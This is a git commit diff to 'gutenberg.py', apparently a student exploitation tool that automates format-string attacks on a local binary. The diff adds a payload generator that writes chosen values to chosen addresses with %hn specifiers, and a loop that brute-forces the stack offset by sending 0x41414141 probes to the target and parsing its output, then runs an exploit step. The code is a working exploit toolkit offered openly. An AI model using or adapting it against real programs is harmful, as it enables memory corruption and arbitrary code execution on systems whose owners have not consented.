97d4299b8cb982efa525002b8beb3472c49e927d
plean <jean.plancher@epitech.eu>
2017-09-28 01:35:11 +0200

    detecting stack offset

--- gutenberg.py
+++ gutenberg.py
@@ -7,10 +7,11 @@
 
 from os import access, X_OK, mkfifo
 from os.path import realpath, isfile
+from io import StringIO
 from math import log
 from signal import signal, SIGINT
 from argparse import ArgumentParser
-from subprocess import call
+from subprocess import run, PIPE
 from multiprocessing import Process
 
 
@@ -32,49 +33,46 @@ FMT_WRITE = "hn"
 #
 # Misc
 #
+MAX_ITER = 1000
 FIFO = "/tmp/gutenberg"
 
 
-def generate_payload(where_to_write, offset, what_to_write, fmt, chr_padd):
+def generate_payload(where_to_write, offset, what_to_write=0x00180010, fmt=FMT_WRITE, chr_padd=0):
     nba2hx = lambda x: ''.join(map(chr, (x & 255, (x >> 8) & 255, (x >> 16) & 255, x >> 24)))
     pw1 = (what_to_write & ((255 << 8) + 255)) - 8
     _pw = what_to_write >> 16
     pw2 = 65536 * (_pw <= pw1) + _pw - pw1 - 8
-    payload = "{}{}%{:05d}x%{:d}${:s}%{:05d}x%{:d}${:s}".format(nba2hx(where_to_write),
+    payload = "{:s}{:s}%{:05d}x%{:d}${:s}%{:05d}x%{:d}${:s}".format(nba2hx(where_to_write),
                                                                 nba2hx(where_to_write + 2),
                                                                 pw1, offset, fmt,
                                                                 pw2, offset + 1, fmt) + " " * chr_padd
     return payload
 
 
-# def exec_cmd_stdin(binary, cmd):
-#     def _exec():
-#         call([realpath(binary)], stdin=open(FIFO, 'r'))
-#         pass
-#     Process(target=_exec).start()
-#     print(cmd, file=open(FIFO, 'w'))
-#     return
+def exec_cmd_stdin(binary, cmd):
+    def _write():
+        print(cmd, file=open(FIFO, 'w'))
+        pass
+    Process(target=_write).start()
+    r = run([realpath(binary)], stdin=open(FIFO, 'r'), stdout=PIPE)
+    return r.stdout
 
 
 def exec_cmd_args(binary, cmd):
-    call([realpath(binary), cmd])
-    pass
+    r = run([realpath(binary), cmd], stdout=PIPE)
+    return r.stdout
 
 
 def check(binary):
     if not access(binary, X_OK):
         print("[-] Binary can't be executed")
         exit(1)
+    else:
+        print("[+] File is executable")
     pass
 
 
 def analyze(binary):
-    where_to_write = 0xfffffc8c
-    offset = 161
-    what_to_write = 0x0eadbeef
-    chr_padd = 0
-    payload = generate_payload(where_to_write, offset, what_to_write, FMT_CHECK, chr_padd)
-
     try:
         if not isfile(realpath(binary)):
             mkfifo(FIFO)
@@ -82,7 +80,17 @@ def analyze(binary):
         print(oe)
         exit(1)
 
-    exec_cmd_args(binary, payload)
+    chr_padd = 0
+    for i in range(MAX_ITER):
+        payload = generate_payload(0x41414141, i, fmt=FMT_CHECK, chr_padd=chr_padd)
+        r = exec_cmd_args(binary, payload)
+        if b'4141' in r:
+            if r.split(b'-')[0][16:] != b'41414141':
+                i = 0
+                chr_padd += 1
+            else:
+                print("WIN", i, r, payload)
+                break
     pass
 
 
@@ -103,9 +111,13 @@ def main():
 
     signal(SIGINT, signal_handler)
 
+    print("[+] Checking file")
     check(args.binary)
+    print("[+] Analyzing file")
     analyze(args.binary)
+    print("[+] Running exploit")
     exploit(args.binary)
+    print("[+] Exiting")
 
 
 def signal_handler(signal, frame):
